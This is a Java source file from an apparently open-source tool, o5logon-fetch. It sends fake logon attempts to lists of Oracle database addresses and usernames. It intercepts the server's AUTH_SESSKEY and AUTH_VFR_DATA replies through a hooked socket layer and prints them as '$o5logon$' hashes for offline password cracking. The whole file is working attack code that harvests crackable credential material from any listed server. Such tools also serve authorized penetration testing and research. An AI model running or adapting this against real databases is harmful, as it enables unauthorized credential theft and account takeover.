/*
 (c) 2014 Harrison Neal.
 
 This file is part of o5logon-fetch.
 
 o5logon-fetch is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 o5logon-fetch is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with o5logon-fetch.  If not, see <http://www.gnu.org/licenses/>.
 */

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketImpl;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.ArrayList;

import MitMSocket.MitMAction;
import MitMSocket.MitMSocketImplFactory;
import MitMSocket.MitMSocketImplFactoryListener;

public class OracleFakeLogon implements MitMSocketImplFactoryListener {

	public static void main(String[] args) {
		if (args.length != 2) {
			showUsage();
		}
		
		new OracleFakeLogon(openFile(args[0]), openFile(args[1])).run();
	}
	
	private ArrayList<String> addresses, usernames;
	private String currentHash;
	
	public OracleFakeLogon(ArrayList<String> addresses, ArrayList<String> usernames) {
		this.addresses = addresses;
		this.usernames = usernames;
	}
	
	public void run() {
		MitMSocketImplFactory sFac = new MitMSocketImplFactory();
		sFac.setListener(this);
		
		try {
			Socket.setSocketImplFactory(sFac);
		} catch (Exception e) {
			e.printStackTrace();
			System.exit(1);
		}
		
		for (String address : addresses) {
			for (String username : usernames) {
				currentHash = null;
				
				try {
			        Connection con = DriverManager.getConnection(
			                address,
			                username,
			                "not_the_password_you_are_looking_for");
			        
			        con.close();
				} catch (Exception ex) {}
				
				if (currentHash != null) {
					System.out.println(address + " " + username + " " + currentHash);
				}
			}
		}
	}

	private final String sess = "AUTH_SESSKEY";
	private final int sessLen = 96;
	private final String salt = "AUTH_VFR_DATA";
	private final int saltLen = 20;
	
	private boolean charIsHex(char a) {
		return ((a >= '0' && a <= '9') || (a >= 'A' && a <= 'F'));
	}
	
	@Override
	public MitMAction socketInputRead(SocketImpl si, InputStream is, byte[] b) {
		try {
			String data = new String(b, "US-ASCII");
			
			int sessIndex = data.indexOf(sess);
			
			if (sessIndex < 0)
				return MitMAction.NOTHING;

			int saltIndex = data.indexOf(salt);
			
			if (saltIndex < 0)
				return MitMAction.NOTHING;

			sessIndex += sess.length();
			saltIndex += salt.length();
			
			for (; sessIndex < data.length(); sessIndex++)
				if (charIsHex(data.charAt(sessIndex)))
					break;
			
			if (sessIndex + sessLen > data.length())
				return MitMAction.NOTHING;
			
			for (int i = 1; i < sessLen; i++)
				if (! charIsHex(data.charAt(sessIndex + i)))
					return MitMAction.NOTHING;
			
			for (; saltIndex < data.length(); saltIndex++)
				if (charIsHex(data.charAt(saltIndex)))
					break;
			
			if (saltIndex + saltLen > data.length())
				return MitMAction.NOTHING;
			
			for (int i = 1; i < saltLen; i++)
				if (! charIsHex(data.charAt(saltIndex + i)))
					return MitMAction.NOTHING;
			
			// At this point, we should have
			// a valid authentication packet.
			
			currentHash = "$o5logon$" + data.substring(sessIndex, sessIndex + sessLen) + "*" + data.substring(saltIndex, saltIndex + saltLen);
			return MitMAction.CLOSE_SOCKET;
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return MitMAction.NOTHING;
	}

	@Override
	public MitMAction socketOutputWrite(SocketImpl si, OutputStream os, byte[] b) {
		// Do nothing on output.
		return MitMAction.NOTHING;
	}
	
	public static ArrayList<String> openFile(String fileName) {
		ArrayList<String> toReturn = new ArrayList<String>();
		
		BufferedReader reader = null;
		
		try {
			reader = new BufferedReader(new FileReader(fileName));
		} catch (Exception ex) {
			System.err.println("Problem opening file:");
			ex.printStackTrace();
			
			System.err.println();
			showUsage();
		}
		
		String line;
		try {
			while ((line = reader.readLine()) != null) {
				toReturn.add(line);
			}
		} catch (Exception ex) {
			System.err.println("Problem reading file:");
			ex.printStackTrace();
		}
		
		try {
			reader.close();
		} catch (Exception ex) {}
		
		return toReturn;
	}
	
	public static void showUsage() {
		System.err.println("Generates fake logon requests to a login server to get hashes.");
		System.err.println("If you're debugging, Wireshark may be useful.");
		System.err.println();
		System.err.println("Usage:");
		System.err.println("java -cp ojdbc6_intentionally_old.jar:. OracleFakeLogon <addresses file> <usernames file>");
		System.err.println();
		System.err.println("Valid address formats:");
		System.err.println("jdbc:oracle:thin:@<host>:<port>:<sid>");
		System.err.println("jdbc:oracle:thin:@//<host>:<port>/<service name>");

		System.exit(1);
	}

}
